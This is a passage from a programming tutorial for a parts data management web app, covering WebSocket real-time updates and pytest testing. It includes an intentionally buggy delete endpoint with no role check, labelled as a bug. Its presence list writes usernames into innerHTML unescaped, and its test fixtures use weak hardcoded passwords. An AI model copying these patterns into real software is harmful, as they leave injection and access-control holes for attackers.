    const message = JSON.parse(event.data);
    console.log("WebSocket message:", message);

    // Route message to appropriate handler
    switch (message.type) {
      case "file_locked":
        handleFileLocked(message);
        break;

      case "file_unlocked":
        handleFileUnlocked(message);
        break;

      case "file_uploaded":
        handleFileUploaded(message);
        break;

      case "user_connected":
        handleUserConnected(message);
        break;

      case "user_disconnected":
        handleUserDisconnected(message);
        break;

      case "online_users":
        handleOnlineUsers(message);
        break;

      case "pong":
        // Heartbeat response
        break;

      default:
        console.warn("Unknown message type:", message.type);
    }
  } catch (error) {
    console.error("Error handling WebSocket message:", error);
  }
}

function handleWebSocketError(error) {
  console.error("WebSocket error:", error);
}

function handleWebSocketClose(event) {
  console.log("WebSocket closed:", event.code, event.reason);
  updateConnectionStatus(false);

  // Attempt reconnect
  scheduleReconnect();
}

function scheduleReconnect() {
  if (reconnectInterval) return;

  console.log("Scheduling WebSocket reconnect...");

  reconnectInterval = setInterval(() => {
    console.log("Attempting WebSocket reconnect...");
    connectWebSocket();
  }, 5000); // Retry every 5 seconds
}

function updateConnectionStatus(connected) {
  // Update UI to show connection status
  const statusEl = document.getElementById("connection-status");
  if (!statusEl) return;

  if (connected) {
    statusEl.textContent = "🟢 Connected";
    statusEl.className = "status-connected";
  } else {
    statusEl.textContent = "🔴 Disconnected";
    statusEl.className = "status-disconnected";
  }
}
```

### Understanding WebSocket Client API

**Creating connection:**

```javascript
ws = new WebSocket(wsUrl);
```

**Event handlers:**

```javascript
ws.onopen; // Connection established
ws.onmessage; // Message received
ws.onerror; // Error occurred
ws.onclose; // Connection closed
```

**Sending messages:**

```javascript
ws.send(JSON.stringify({ type: "ping" }));
```

**Connection states:**

```javascript
WebSocket.CONNECTING; // 0
WebSocket.OPEN; // 1
WebSocket.CLOSING; // 2
WebSocket.CLOSED; // 3

if (ws.readyState === WebSocket.OPEN) {
  ws.send(data);
}
```

### Reconnection Logic

**Why automatic reconnection?**

**Scenarios:**

- Network glitch (WiFi drops)
- Server restart
- Load balancer timeout
- Browser sleep/wake

**Without reconnection:** User loses real-time updates until manual refresh

**With reconnection:** Seamlessly reconnects in background

**The implementation:**

```javascript
function scheduleReconnect() {
  if (reconnectInterval) return; // Already scheduled

  reconnectInterval = setInterval(() => {
    connectWebSocket();
  }, 5000); // Try every 5 seconds
}
```

**Exponential backoff (better approach):**

```javascript
let reconnectDelay = 1000;
const maxDelay = 30000;

function scheduleReconnect() {
  setTimeout(() => {
    connectWebSocket();
    reconnectDelay = Math.min(reconnectDelay * 2, maxDelay);
  }, reconnectDelay);
}
```

This prevents hammering the server (waits longer after each failure).

---

## 9.6: Handling Real-Time Events

### File Locked Handler

```javascript
function handleFileLocked(message) {
  console.log("File locked:", message.filename, "by", message.user);

  // Update file list in memory
  const file = allFiles.find((f) => f.name === message.filename);
  if (file) {
    file.status = "checked_out";
    file.locked_by = message.user;
  }

  // Re-render file list
  displayFilteredFiles();

  // Show notification (unless it's the current user)
  const currentUser = localStorage.getItem("username");
  if (message.user !== currentUser) {
    showNotification(`${message.user} locked ${message.filename}`, "info");
  }
}

function handleFileUnlocked(message) {
  console.log("File unlocked:", message.filename);

  // Update file list
  const file = allFiles.find((f) => f.name === message.filename);
  if (file) {
    file.status = "available";
    file.locked_by = null;
  }

  // Re-render
  displayFilteredFiles();

  // Show notification
  const currentUser = localStorage.getItem("username");
  if (message.user !== currentUser) {
    const forceMsg = message.was_forced ? " (forced by admin)" : "";
    showNotification(
      `${message.filename} is now available${forceMsg}`,
      "success"
    );
  }
}

function handleFileUploaded(message) {
  console.log("File uploaded:", message.filename);

  // Reload file list to include new file
  loadFiles();

  // Show notification
  const currentUser = localStorage.getItem("username");
  if (message.user !== currentUser) {
    showNotification(`${message.user} uploaded ${message.filename}`, "info");
  }
}
```

### Understanding the Pattern

**The update flow:**

1. **Server broadcasts event** - "file_locked"
2. **All clients receive** - Including the one who triggered it
3. **Update local state** - Modify `allFiles` array
4. **Re-render UI** - Call `displayFilteredFiles()`
5. **Show notification** - If it wasn't the current user

**Why check `if (message.user !== currentUser)`?**

- User locks file
- Gets immediate response from HTTP endpoint (success message)
- Also receives WebSocket broadcast
- Don't want to show notification for their own action

**Alternative approach: Optimistic updates**

```javascript
async function handleCheckout(filename) {
    // 1. Update UI immediately (optimistic)
    const file = allFiles.find(f => f.name === filename);
    file.status = 'checked_out';
    file.locked_by = currentUser;
    displayFilteredFiles();

    try {
        // 2. Send request
        await fetch('/api/files/checkout', ...);

        // 3. Success - already updated!

    } catch (error) {
        // 4. Failure - revert optimistic update
        file.status = 'available';
        file.locked_by = null;
        displayFilteredFiles();
        showNotification('Checkout failed', 'error');
    }
}
```

This makes the UI feel instant, but adds complexity.

---

## 9.7: Presence Indicators - Who's Online

### Online Users Handler

```javascript
let onlineUsers = [];

function handleUserConnected(message) {
  console.log("User connected:", message.username);
  onlineUsers = message.online_users;
  updateOnlineUsersList();
}

function handleUserDisconnected(message) {
  console.log("User disconnected:", message.username);
  onlineUsers = message.online_users;
  updateOnlineUsersList();
}

function handleOnlineUsers(message) {
  console.log("Online users:", message.users);
  onlineUsers = message.users;
  updateOnlineUsersList();
}

function updateOnlineUsersList() {
  const container = document.getElementById("online-users");
  if (!container) return;

  if (onlineUsers.length === 0) {
    container.innerHTML = "<p>No other users online</p>";
    return;
  }

  const currentUser = localStorage.getItem("username");

  let html = '<ul class="user-list">';

  onlineUsers.forEach((user) => {
    const isCurrentUser = user === currentUser;
    const className = isCurrentUser ? "current-user" : "";
    const label = isCurrentUser ? " (you)" : "";

    html += `
            <li class="${className}">
                <span class="status-indicator"></span>
                ${user}${label}
            </li>
        `;
  });

  html += "</ul>";
  container.innerHTML = html;
}
```

### Add Online Users Section to HTML

Add to `index.html`:

```html
<section>
  <h2>Online Users</h2>
  <div id="online-users">
    <p>Connecting...</p>
  </div>
</section>
```

### Connection Status Indicator

Add to header in `index.html`:

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </div>
    <div class="header-actions">
      <span id="connection-status" class="status-disconnected">
        🔴 Disconnected
      </span>
      <button
        id="admin-panel-btn"
        class="btn btn-secondary"
        style="display: none;"
      >
        Admin Panel
      </button>
      <button id="logout-btn" class="btn btn-secondary">Logout</button>
    </div>
  </div>
</header>
```

### Presence CSS

```css
/* ============================================
   ONLINE USERS & PRESENCE
   ============================================ */

.user-list {
  list-style: none;
  padding: 0;
}

.user-list li {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  align-items: center;
}

.user-list li:last-child {
  border-bottom: none;
}

.status-indicator {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #28a745;
  margin-right: 0.5rem;
  animation: pulse 2s ease-in-out infinite;
}

@keyframes pulse {
  0%,
  100% {
    opacity: 1;
  }
  50% {
    opacity: 0.5;
  }
}

.current-user {
  font-weight: bold;
  background: #f0f1ff;
}

/* Connection Status */
.status-connected {
  color: #28a745;
  font-weight: 500;
  margin-right: 1rem;
}

.status-disconnected {
  color: #dc3545;
  font-weight: 500;
  margin-right: 1rem;
}
```

### Initialize WebSocket on Page Load

Update `app.js` DOMContentLoaded:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded");

  // Initialize WebSocket
  connectWebSocket();

  // Load files
  loadFiles();

  // ... rest of initialization ...
});
```

---

## 9.8: Heartbeat - Keeping Connections Alive

### Why Heartbeat?

**The problem:**

- Network intermediaries (proxies, load balancers) close idle connections
- Default timeout: often 60-90 seconds
- WebSocket appears connected, but is actually dead

**The solution:**

- Periodically send "ping" messages
- Server responds with "pong"
- Keeps connection active
- Detects dead connections

### Implement Client Heartbeat

Add to `app.js`:

```javascript
let heartbeatInterval = null;

function handleWebSocketOpen(event) {
  console.log("WebSocket connected");

  // Clear reconnect timer
  if (reconnectInterval) {
    clearInterval(reconnectInterval);
    reconnectInterval = null;
  }

  // Start heartbeat
  startHeartbeat();

  // Show connection indicator
  updateConnectionStatus(true);

  // Request online users
  ws.send(
    JSON.stringify({
      type: "get_online_users",
    })
  );
}

function handleWebSocketClose(event) {
  console.log("WebSocket closed:", event.code, event.reason);
  updateConnectionStatus(false);

  // Stop heartbeat
  stopHeartbeat();

  // Attempt reconnect
  scheduleReconnect();
}

function startHeartbeat() {
  // Send ping every 30 seconds
  heartbeatInterval = setInterval(() => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      console.log("Sending heartbeat ping");
      ws.send(JSON.stringify({ type: "ping" }));
    }
  }, 30000); // 30 seconds
}

function stopHeartbeat() {
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
    heartbeatInterval = null;
  }
}
```

### Server-Side Heartbeat Handling

Already implemented in the WebSocket endpoint:

```python
if message_type == "ping":
    await websocket.send_json({
        "type": "pong",
        "timestamp": datetime.now(timezone.utc).isoformat()
    })
```

### Advanced: Detect Missed Pongs

```javascript
let lastPongTime = null;
let pongCheckInterval = null;

function startHeartbeat() {
  lastPongTime = Date.now();

  // Send ping every 30 seconds
  heartbeatInterval = setInterval(() => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: "ping" }));
    }
  }, 30000);

  // Check if we're receiving pongs
  pongCheckInterval = setInterval(() => {
    const timeSinceLastPong = Date.now() - lastPongTime;

    if (timeSinceLastPong > 90000) {
      // 90 seconds = 3 missed pongs
      console.warn("No pong received, connection might be dead");

      // Force reconnect
      if (ws) {
        ws.close();
      }
    }
  }, 45000); // Check every 45 seconds
}

function handleWebSocketMessage(event) {
  const message = JSON.parse(event.data);

  if (message.type === "pong") {
    lastPongTime = Date.now();
    console.log("Received pong");
  }

  // ... rest of message handling ...
}

function stopHeartbeat() {
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
    heartbeatInterval = null;
  }

  if (pongCheckInterval) {
    clearInterval(pongCheckInterval);
    pongCheckInterval = null;
  }
}
```

This actively detects dead connections and forces reconnection.

---

## Stage 9 Complete - Real-Time Collaboration

### What You Built

You now have:

- WebSocket server with connection management
- Real-time file status updates
- Live notifications for all actions
- Presence indicators (who's online)
- Automatic reconnection
- Heartbeat to keep connections alive
- Broadcast messaging to all clients

### Key Concepts Mastered

**WebSocket Protocol:**

- Full-duplex communication
- WebSocket handshake
- Frame format
- Close codes

**Connection Management:**

- Connection pool (tracking all clients)
- Broadcasting to all/specific users
- Handling disconnections gracefully

**Client-Side Patterns:**

- Reconnection with backoff
- Heartbeat/ping-pong
- Event-driven UI updates
- Presence tracking

**Real-Time UX:**

- Instant feedback
- Live notifications
- Connection status indicators
- Online user lists

### Verification Checklist

- [ ] WebSocket connects on page load
- [ ] Can see other users online
- [ ] When someone locks a file, see it update live
- [ ] When someone unlocks a file, see it update live
- [ ] Receive notifications for others' actions
- [ ] Connection status shows green when connected
- [ ] Automatically reconnects after network failure
- [ ] Heartbeat keeps connection alive
- [ ] Understand WebSocket vs HTTP
- [ ] Understand broadcast pattern

### The Real-Time Experience

**Before WebSockets:**

```
User A locks file → User B sees nothing
User B refreshes → "Oh, it's locked now"
```

**With WebSockets:**

```
User A locks file → User B sees status change INSTANTLY
User B gets notification: "User A locked file.mcam"
User B sees User A in online users list
```

#

In **Stage 10**, we'll add **Testing & Quality Assurance**:

- Unit tests with pytest
- Integration tests
- WebSocket testing
- Test coverage measurement
- Continuous Integration (CI)
- Test-Driven Development (TDD) principles

Your app is now collaborative in real-time. Next, we make sure it's bulletproof with comprehensive testing!

---

### Stage 10: Testing & Quality Assurance - Building Bulletproof Software

## Introduction: The Goal of This Stage

Your app has many features, but how do you know they all work correctly? How do you ensure a new feature doesn't break existing functionality? How do you refactor with confidence?

In this stage, you'll master **software testing** - the practice that separates hobby projects from production systems.

By the end of this stage, you will:

- Understand the testing pyramid (unit, integration, e2e)
- Write unit tests with pytest
- Use fixtures for test setup/teardown
- Test FastAPI endpoints
- Mock external dependencies (Git, filesystem)
- Test async code and WebSockets
- Measure test coverage
- Implement Test-Driven Development (TDD)
- Set up Continuous Integration (CI)
- Understand testing best practices

**Time Investment:** 8-10 hours

---

## 10.1: Why Testing Matters - The Cost of Bugs

### The Bug Cost Curve

**When you find a bug:**

| Stage                  | Cost to Fix | Example                                |
| ---------------------- | ----------- | -------------------------------------- |
| **During development** | $1          | You catch it while writing code        |
| **During code review** | $10         | Teammate spots it before merge         |
| **During QA testing**  | $100        | QA team finds it before release        |
| **In production**      | $1,000+     | Customer data corrupted, emergency fix |

**Real example from your PDM app:**

**Without tests:**

```python
### Bug: Anyone can delete any file (forgot to check admin role)
@app.delete("/api/files/{filename}")
def delete_file(filename: str, current_user: User = Depends(get_current_user)):
    os.remove(REPO_PATH / filename)  # OOPS! No role check!
```

**Cost:** User accidentally deletes critical file → hours of Git recovery → angry customers

**With tests:**

```python
def test_delete_file_requires_admin():
    # Regular user tries to delete
    response = client.delete("/api/files/test.mcam", headers=user_headers)
    assert response.status_code == 403  # Forbidden
    # TEST FAILS → You catch bug before it reaches production
```

**Cost:** 30 seconds to fix

### The Testing Pyramid

```
       /\
      /  \     E2E (End-to-End)
     /____\    - Few tests
    /      \   - Slow
   /        \  - Brittle
  /__________\
  /          \ Integration
 /            \ - Some tests
/______________\- Medium speed
/              \
/                \
/                  \ Unit Tests
/____________________\ - Many tests
                      - Fast
                      - Focused
```

**Unit Tests** (70%)

- Test individual functions in isolation
- Fast (milliseconds)
- Many of them
- Example: "Does `verify_password()` work correctly?"

**Integration Tests** (20%)

- Test components working together
- Medium speed (seconds)
- Fewer of them
- Example: "Does checkout → Git commit → broadcast work?"

**E2E Tests** (10%)

- Test entire user workflows
- Slow (minutes)
- Few of them
- Example: "Can user log in, upload file, and download it?"

---

## 10.2: Setting Up pytest

### Install Testing Dependencies

```bash
pip install pytest pytest-asyncio pytest-cov httpx
```

**What each does:**

- `pytest` - The testing framework
- `pytest-asyncio` - Support for testing async code
- `pytest-cov` - Code coverage measurement
- `httpx` - HTTP client for testing FastAPI (supports async)

### Update requirements.txt

```bash
pip freeze > requirements.txt
```

### Create Test Directory Structure

```bash
cd backend
mkdir tests
touch tests/__init__.py
touch tests/test_auth.py
touch tests/test_files.py
touch tests/test_git.py
```

**Your structure:**

```
backend/
├── main.py
├── tests/
│   ├── __init__.py
│   ├── test_auth.py
│   ├── test_files.py
│   └── test_git.py
└── git_repo/
```

---

## 10.3: pytest Basics - Your First Test

### Simple Unit Test

Create `tests/test_auth.py`:

```python
"""
Tests for authentication and authorization.
"""
import pytest
from main import verify_password, pwd_context

### ============================================
### UNIT TESTS - Password Hashing
### ============================================

def test_password_hashing():
    """Test that password hashing and verification work."""
    password = "MySecurePassword123"

    # Hash the password
    hashed = pwd_context.hash(password)

    # Verify correct password
    assert verify_password(password, hashed) == True

    # Verify wrong password
    assert verify_password("WrongPassword", hashed) == False

def test_password_hash_is_different():
    """Test that same password produces different hashes (salt)."""
    password = "SamePassword"

    hash1 = pwd_context.hash(password)
    hash2 = pwd_context.hash(password)

    # Hashes should be different (due to random salt)
    assert hash1 != hash2

    # But both should verify
    assert verify_password(password, hash1) == True
    assert verify_password(password, hash2) == True

def test_empty_password():
    """Test handling of empty password."""
    with pytest.raises(ValueError):
        pwd_context.hash("")
```

### Running Tests

```bash
### Run all tests
pytest

### Run with verbose output
pytest -v

### Run specific test file
pytest tests/test_auth.py

### Run specific test function
pytest tests/test_auth.py::test_password_hashing
```

### Understanding pytest Assertions

**Basic assertions:**

```python
assert 1 + 1 == 2
assert "hello".upper() == "HELLO"
assert len([1, 2, 3]) == 3
```

**When assertion fails:**

```python
def test_example():
    result = 1 + 1
    assert result == 3  # FAIL

### Output:
### AssertionError: assert 2 == 3
```

pytest automatically shows you what went wrong!

**Advanced assertions:**

```python
### Check if exception is raised
with pytest.raises(ValueError):
    int("not a number")

### Check if exception message contains text
with pytest.raises(ValueError, match="invalid literal"):
    int("not a number")

### Check dictionary contents
result = {"name": "John", "age": 30}
assert result["name"] == "John"

### Check if item in list
assert "apple" in ["apple", "banana", "orange"]
```

---

## 10.4: Test Fixtures - Setup and Teardown

### What are Fixtures?

**Fixtures** are functions that provide data/setup for tests.

**Without fixtures:**

```python
def test_checkout():
    # Setup
    create_test_user()
    create_test_file()
    login_user()

    # Test
    response = checkout_file()

    # Teardown
    delete_test_user()
    delete_test_file()
    logout_user()

def test_checkin():
    # Setup (DUPLICATED!)
    create_test_user()
    create_test_file()
    login_user()

    # Test
    response = checkin_file()

    # Teardown (DUPLICATED!)
    delete_test_user()
    delete_test_file()
    logout_user()
```

**With fixtures:**

```python
@pytest.fixture
def authenticated_user():
    user = create_test_user()
    login_user(user)
    yield user  # Provide to test
    # Cleanup after test
    logout_user()
    delete_test_user()

def test_checkout(authenticated_user):
    # authenticated_user is automatically provided!
    response = checkout_file()
    assert response.status_code == 200

def test_checkin(authenticated_user):
    response = checkin_file()
    assert response.status_code == 200
```

### Create Test Configuration

Create `tests/conftest.py`:

```python
"""
pytest configuration and shared fixtures.

conftest.py is automatically loaded by pytest.
Fixtures defined here are available to all tests.
"""
import pytest
from fastapi.testclient import TestClient
from pathlib import Path
import tempfile
import shutil
import os

from main import app, GIT_REPO_PATH, REPO_PATH, LOCKS_FILE, USERS_FILE

### ============================================
### FIXTURES - Test Setup/Teardown
### ============================================

@pytest.fixture(scope="function")
def temp_git_repo(monkeypatch):
    """
    Create a temporary Git repository for testing.

    This prevents tests from modifying the real repo.
    Uses 'function' scope - created fresh for each test.
    """
    # Create temporary directory
    temp_dir = tempfile.mkdtemp()
    temp_repo_path = Path(temp_dir) / 'git_repo'
    temp_repo_path.mkdir()

    # Monkey-patch the global paths
    monkeypatch.setattr('main.GIT_REPO_PATH', temp_repo_path)
    monkeypatch.setattr('main.REPO_PATH', temp_repo_path / 'repo')
    monkeypatch.setattr('main.LOCKS_FILE', temp_repo_path / 'locks.json')
    monkeypatch.setattr('main.USERS_FILE', temp_repo_path / 'users.json')

    # Initialize Git repo
    from main import initialize_git_repo
    initialize_git_repo()

    yield temp_repo_path

    # Cleanup after test
    shutil.rmtree(temp_dir)

@pytest.fixture(scope="function")
def client(temp_git_repo):
    """
    FastAPI test client.

    Provides a client for making HTTP requests to the app.
    """
    from fastapi.testclient import TestClient
    return TestClient(app)

@pytest.fixture(scope="function")
def admin_token(client):
    """
    Get JWT token for admin user.
    """
    # Login as admin
    response = client.post(
        "/api/auth/login",
        data={"username": "admin", "password": "admin123"}
    )

    assert response.status_code == 200
    data = response.json()
    return data["access_token"]

@pytest.fixture(scope="function")
def user_token(client):
    """
    Get JWT token for regular user.
    """
    response = client.post(
        "/api/auth/login",
        data={"username": "john", "password": "password123"}
    )

    assert response.status_code == 200
    data = response.json()
    return data["access_token"]

@pytest.fixture(scope="function")
def admin_headers(admin_token):
    """
    Authorization headers for admin user.
    """
    return {"Authorization": f"Bearer {admin_token}"}

@pytest.fixture(scope="function")
def user_headers(user_token):
    """
    Authorization headers for regular user.
    """
    return {"Authorization": f"Bearer {user_token}"}

@pytest.fixture(scope="function")
def sample_file(temp_git_repo):
    """
    Create a sample .mcam file for testing.
    """
    file_path = temp_git_repo / 'repo' / 'TEST001.mcam'
    file_path.write_text("G0 X0 Y0\nG1 X10 Y10\n")

    return file_path
```

### Understanding Fixtures

**`@pytest.fixture` decorator:**

```python
@pytest.fixture
def my_data():
    return {"name": "John"}

def test_something(my_data):  # Fixture automatically passed
    assert my_data["name"] == "John"
```

**Fixture scopes:**

```python
@pytest.fixture(scope="function")  # Default - new for each test
@pytest.fixture(scope="class")     # Shared across test class
@pytest.fixture(scope="module")    # Shared across test file
@pytest.fixture(scope="session")   # Shared across entire test run
```

**The `yield` pattern:**

```python
@pytest.fixture
def resource():
    # Setup (before yield)
    r = create_resource()

    yield r  # Provide to test

    # Teardown (after yield)
    r.cleanup()
```

**Example execution:**

```python
def test_example(resource):
    # Before this: create_resource() runs

    use(resource)

    # After this: r.cleanup() runs
```

**`monkeypatch` fixture:**

Built-in pytest fixture for temporarily modifying code:

```python
def test_with_monkeypatch(monkeypatch):
    # Replace global variable
    monkeypatch.setattr('main.SECRET_KEY', 'test-key')

    # Replace function
    monkeypatch.setattr('main.send_email', lambda x: None)

    # Set environment variable
    monkeypatch.setenv('API_KEY', 'test-key')

    # After test: everything is restored automatically
```

---

## 10.5: Testing FastAPI Endpoints

### Authentication Tests

Update `tests/test_auth.py`:

```python
def test_login_success(client):
    """Test successful login."""
    response = client.post(
        "/api/auth/login",
        data={
            "username": "admin",
            "password": "admin123"
        }
    )

    assert response.status_code == 200
    data = response.json()

    assert "access_token" in data
    assert data["token_type"] == "bearer"
    assert len(data["access_token"]) > 0

def test_login_wrong_password(client):
    """Test login with wrong password."""
    response = client.post(
        "/api/auth/login",
        data={
            "username": "admin",
            "password": "wrongpassword"
        }
    )

    assert response.status_code == 401
    data = response.json()
    assert "detail" in data

def test_login_nonexistent_user(client):
    """Test login with non-existent user."""
    response = client.post(
        "/api/auth/login",
        data={
            "username": "doesnotexist",
            "password": "password"
        }
    )

    assert response.status_code == 401

def test_protected_endpoint_without_token(client):
    """Test accessing protected endpoint without authentication."""
    response = client.get("/api/files")

    assert response.status_code == 401

def test_protected_endpoint_with_invalid_token(client):
    """Test accessing protected endpoint with invalid token."""
    response = client.get(
        "/api/files",
        headers={"Authorization": "Bearer invalid-token"}
    )

    assert response.status_code == 401

def test_protected_endpoint_with_valid_token(client, user_token):
    """Test accessing protected endpoint with valid token."""
    response = client.get(
        "/api/files",
        headers={"Authorization": f"Bearer {user_token}"}
    )

    assert response.status_code == 200
```

### File Operations Tests

Create `tests/test_files.py`:

```python
"""
Tests for file operations (checkout, checkin, upload, download).
"""
import pytest
from io import BytesIO

def test_get_files_authenticated(client, user_headers):
    """Test getting file list with authentication."""
    response = client.get("/api/files", headers=user_headers)

    assert response.status_code == 200
    data = response.json()

    assert "files" in data
    assert isinstance(data["files"], list)

def test_checkout_file(client, user_headers, sample_file):
    """Test checking out a file."""
    response = client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "Testing checkout"
        }
    )

    assert response.status_code == 200
    data = response.json()

    assert data["success"] == True
    assert "checked out" in data["message"].lower()

def test_checkout_already_locked_file(client, user_headers, sample_file):
    """Test checking out a file that's already locked."""
    # First checkout
    client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "First checkout"
        }
    )

    # Second checkout should fail
    response = client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "jane",
            "message": "Second checkout"
        }
    )

    assert response.status_code == 409  # Conflict

def test_checkin_file(client, user_headers, sample_file):
    """Test checking in a file."""
    # First checkout
    client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "Testing"
        }
    )

    # Then checkin
    response = client.post(
        "/api/files/checkin",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john"
        }
    )

    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True

def test_checkin_wrong_user(client, user_headers, admin_headers, sample_file):
    """Test that only the lock owner can checkin."""
    # User checks out
    client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "Testing"
        }
    )

    # Different user tries to checkin
    response = client.post(
        "/api/files/checkin",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "admin"  # Different user!
        }
    )

    assert response.status_code == 403  # Forbidden

def test_upload_file(client, user_headers):
    """Test file upload."""
    file_content = b"G0 X0 Y0\nG1 X10 Y10\n"

    response = client.post(
        "/api/files/upload",
        headers=user_headers,
        files={
            "file": ("UPLOAD_TEST.mcam", BytesIO(file_content), "application/octet-stream")
        }
    )

    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True

def test_upload_wrong_extension(client, user_headers):
    """Test that only .mcam files can be uploaded."""
    response = client.post(
        "/api/files/upload",
        headers=user_headers,
        files={
            "file": ("badfile.txt", BytesIO(b"content"), "text/plain")
        }
    )

    assert response.status_code == 400

def test_download_file(client, user_headers, sample_file):
    """Test file download."""
    response = client.get(
        "/api/files/TEST001.mcam/download",
        headers=user_headers
    )

    assert response.status_code == 200
    assert response.content == b"G0 X0 Y0\nG1 X10 Y10\n"

def test_delete_file_as_user(client, user_headers, sample_file):
    """Test that regular users cannot delete files."""
    response = client.delete(
        "/api/admin/files/TEST001.mcam",
        headers=user_headers
    )

    assert response.status_code == 403  # Forbidden

def test_delete_file_as_admin(client, admin_headers, sample_file):
    """Test that admins can delete files."""
    response = client.delete(
        "/api/admin/files/TEST001.mcam",
        headers=admin_headers
    )

    assert response.status_code == 200

    # Verify file is gone
    assert not sample_file.exists()
```

---

## 10.6: Mocking and Patching

### Why Mock?

**Problem:** You want to test checkout logic, but don't want to:

- Actually push to GitLab (slow, requires network)
- Send real emails
- Charge real credit cards
- Delete real files

**Solution:** **Mock** external dependencies - replace them with fake versions for testing.

### Mocking GitLab Push

```python
from unittest.mock import Mock, patch

def test_checkout_without_gitlab_push(client, user_headers, sample_file):
    """Test checkout without actually pushing to GitLab."""

    # Mock the push_to_gitlab function
    with patch('main.push_to_gitlab') as mock_push:
        response = client.post(
            "/api/files/checkout",
            headers=user_headers,
            json={
                "filename": "TEST001.mcam",
                "user": "john",
                "message": "Testing"
            }
        )

        assert response.status_code == 200

        # Verify push was called
        mock_push.assert_called_once()
```

### Understanding `patch`

**What `patch` does:**

```python
with patch('main.push_to_gitlab') as mock_push:
    # Inside this block:
    # - main.push_to_gitlab is replaced with a Mock object
    # - All calls to it are recorded

    checkout_file()  # This calls push_to_gitlab

    # After block: original function is restored
```

**Checking if mock was called:**

```python
mock_push.assert_called()              # Called at least once
mock_push.assert_called_once()         # Called exactly once
mock_push.assert_not_called()          # Never called

### Check arguments
mock_push.assert_called_with(arg1, arg2)
```

**Making mock return a value:**

```python
with patch('main.get_user') as mock_get_user:
    # Make it return specific data
    mock_get_user.return_value = {
        "username": "testuser",
        "role": "admin"
    }

    user = get_user("testuser")
    assert user["role"] == "admin"
```

**Making mock raise an exception:**

```python
with patch('main.push_to_gitlab') as mock_push:
    mock_push.side_effect = Exception("Network error")

    # Now push_to_gitlab() raises Exception
```

### Mocking Git Operations

Create `tests/test_git.py`:

```python
"""
Tests for Git integration.
"""
import pytest
from unittest.mock import patch, Mock

def test_git_commit_on_checkout(client, user_headers, sample_file, temp_git_repo):
    """Test that checkout creates a Git commit."""
    from main import git_repo

    # Get initial commit count
    initial_commits = len(list(git_repo.iter_commits()))

    # Checkout file
    client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "Testing Git commit"
        }
    )

    # Verify new commit was created
    new_commits = len(list(git_repo.iter_commits()))
    assert new_commits == initial_commits + 2  # checkout + audit log

def test_commit_message_format(client, user_headers, sample_file, temp_git_repo):
    """Test that commit messages follow expected format."""
    from main import git_repo

    client.post(
        "/api/files/checkout",
        headers=user_headers,
        json={
            "filename": "TEST001.mcam",
            "user": "john",
            "message": "Testing"
        }
    )

    # Get latest commit
    latest_commit = list(git_repo.iter_commits())[0]

    # Verify message format
    assert "TEST001.mcam" in latest_commit.message
    assert "john" in latest_commit.message

def test_git_push_failure_handling(client, user_headers, sample_file):
    """Test that push failures don't break checkout."""

    with patch('main.push_to_gitlab') as mock_push:
        # Make push fail
        mock_push.side_effect = Exception("GitLab unavailable")

        # Checkout should still succeed
        response = client.post(
            "/api/files/checkout",
            headers=user_headers,
            json={
                "filename": "TEST001.mcam",
                "user": "john",
                "message": "Testing"
            }
        )

        # Checkout succeeds even though push failed
        assert response.status_code == 200
```

---

## 10.7: Testing Async Code

### The Problem with Async Tests

```python
### This DOESN'T WORK
def test_async_function():
    result = await my_async_function()  # SyntaxError!
    assert result == "expected"
```

**Solution:** Use `pytest-asyncio`:

```python
import pytest

@pytest.mark.asyncio
async def test_async_function():
    result = await my_async_function()
    assert result == "expected"
```

### Testing WebSocket Connection

```python
"""
Tests for WebSocket functionality.
"""
import pytest
from fastapi.testclient import TestClient

def test_websocket_requires_auth(client):
    """Test that WebSocket requires authentication."""
    with client.websocket_connect("/ws") as websocket:
        # Should close immediately (no token)
        data = websocket.receive()
        # Connection should be closed
        assert websocket.closed

def test_websocket_with_auth(client, user_token):
    """Test WebSocket connection with authentication."""
    with client.websocket_connect(f"/ws?token={user_token}") as websocket:
        # Should connect successfully
        assert not websocket.closed

        # Send ping
        websocket.send_json({"type": "ping"})

        # Receive pong
        data = websocket.receive_json()
        assert data["type"] == "pong"

def test_websocket_broadcasts_file_lock(client, user_token, admin_token, sample_file):
    """Test that file lock events are broadcast to all connected users."""

    # Connect two clients
    with client.websocket_connect(f"/ws?token={user_token}") as ws1, \
         client.websocket_connect(f"/ws?token={admin_token}") as ws2:

        # User 1 checks out file
        client.post(
            "/api/files/checkout",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "filename": "TEST001.mcam",
                "user": "john",
                "message": "Testing broadcast"
            }
        )

        # Both WebSocket clients should receive the event
        msg1 = ws1.receive_json()
        msg2 = ws2.receive_json()

        # At least one should be the file_locked event
        messages = [msg1, msg2]
        file_locked = [m for m in messages if m.get("type") == "file_locked"]

        assert len(file_locked) > 0
        assert file_locked[0]["filename"] == "TEST001.mcam"
```

---

## 10.8: Test Coverage

### What is Test Coverage?

**Coverage** = percentage of code executed by tests

**Example:**

```python
def divide(a, b):
    if b == 0:           # Line 1
        return None      # Line 2 (never tested!)
    return a / b         # Line 3

### Test
def test_divide():
    assert divide(10, 2) == 5
    # Coverage: 66% (lines 1 and 3, but not 2)
```

